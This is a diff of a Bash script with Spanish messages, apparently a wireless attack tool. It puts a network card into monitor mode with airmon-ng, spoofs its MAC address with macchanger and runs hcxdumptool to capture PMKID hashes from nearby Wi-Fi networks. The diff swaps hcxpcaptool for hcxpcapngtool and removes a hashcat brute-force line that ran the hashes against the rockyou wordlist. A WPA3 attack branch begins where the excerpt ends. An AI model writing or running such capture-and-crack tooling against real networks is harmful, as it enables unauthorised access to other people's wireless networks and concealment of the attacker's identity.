@@ -73,14 +73,19 @@ function dependencies() {
 }
 
 function startMonitorMode() {
+    ifconfig $networkCard > /dev/null 2>&1
+    if [ $? -ne 0 ]; then
+        echo -e "${redColour}[!] La tarjeta de red $networkCard no existe.${endColour}"
+        exit 1
+    fi
+
     echo -e "${yellowColour}[*]${endColour}${grayColour} Configurando tarjeta de red en modo monitor...${endColour}"
-    ifconfig $networkCard down
-    iwconfig $networkCard mode monitor
-    ifconfig $networkCard up
+    airmon-ng start $networkCard > /dev/null 2>&1
     if [ $? -ne 0 ]; then
         echo -e "${redColour}[!] Error al configurar $networkCard en modo monitor${endColour}"
         exit 1
     fi
+
     ifconfig ${networkCard}mon down
     macchanger -a ${networkCard}mon > /dev/null 2>&1
     ifconfig ${networkCard}mon up
@@ -92,6 +97,7 @@ function startMonitorMode() {
 
 function restoreManagedMode() {
     echo -e "${yellowColour}[*]${endColour}${grayColour} Restaurando tarjeta de red a modo gestionado...${endColour}"
+    airmon-ng stop ${networkCard}mon > /dev/null 2>&1
     ifconfig ${networkCard} down
     iwconfig ${networkCard} mode managed
     ifconfig ${networkCard} up
@@ -135,16 +141,13 @@ function startAttack() {
         echo -e "${yellowColour}[*]${endColour}${grayColour} Iniciando ataque PKMID.${endColour}"
         timeout 180 bash -c "hcxdumptool -i ${networkCard}mon --enable_status=1 -o Captura & while :; do sleep 1; echo -n '.'; done"
         echo -e "\n\n${yellowColour}[*]${endColour}${grayColour} Obteniendo Hashes...${endColour}\n"
-        hcxpcaptool -z myHashes Captura
+        hcxpcapngtool -o myHashes Captura
         rm Captura 2>/dev/null
 
         if [ -f myHashes ]; then
-            echo -e "\n${yellowColour}[*]${endColour}${grayColour} Iniciando proceso de fuerza bruta...${endColour}\n"
-            hashcat -m 16800 /usr/share/wordlists/rockyou.txt myHashes -d 1 --force
+            echo -e "\n${yellowColour}[*]${endColour}${grayColour} Hashes obtenidos en el archivo ${endColour}${blueColour}myHashes${endColour}"
         else
-            echo -e "\n${redColour}[!] No se ha podido capturar el paquete necesario...${endColour}\n"
-            rm Captura* 2>/dev/null
-            sleep 2
+            echo -e "\n${redColour}[!] No se ha podido capturar el paquete necesario.${endColour}"
         fi
     elif [ "$attack_mode" == "WPA3" ]; then
         echo -e "${yellowColour}[*]${endColour}${grayColour} Iniciando ataque WPA3.${endColour}"
